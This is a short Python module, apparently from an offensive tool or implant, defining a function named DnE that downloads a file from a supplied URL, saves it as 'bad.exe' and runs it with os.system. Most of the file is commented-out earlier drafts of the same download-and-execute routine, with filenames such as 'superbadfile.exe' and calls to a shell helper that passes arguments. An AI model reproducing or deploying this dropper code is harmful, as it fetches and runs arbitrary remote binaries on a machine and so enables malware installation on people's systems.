import urllib.request, requests, hashlib, os, urllib
from urllib.request import urlopen
from libs import shell
def DnE(url, args, noargs):
    #args should be enclosed in brackets (EX: [-f,-h] w/no spaces)
#    response = requests.get(url, verify=False)
#    filename = hashlib.md5(bytes(response.text, "utf-8"))
#    filename = str(filename.hexdigest())
 #   response = urllib.request.urlretrieve(url, supersuperbadfile.exe)
#    with open(filename, "w", encoding="utf-16") as fHandle:
#    open('superbadfile.exe', 'wb').write(filename.content)
#    if noargs:
        # execute downloaded binary w/no args
        #output = shell.executeSysCmd(filename + ".exe", "", True)
#        output = shell.executeSysCmd(superbadfile.exe, "", True)
#        return output
#    else:
#        argslist = args[1:len(args)-1].split(",")
        #output = shell.executeSysCmd(filename + ".exe", argslist, False)
#        output = shell.executeSysCmd(filename, argslist, False)
#        return output
    with urlopen(url) as webpage:
        content = webpage.read()
    with open( 'bad.exe', 'wb' ) as download:
        download.write( content )
    os.system('bad.exe')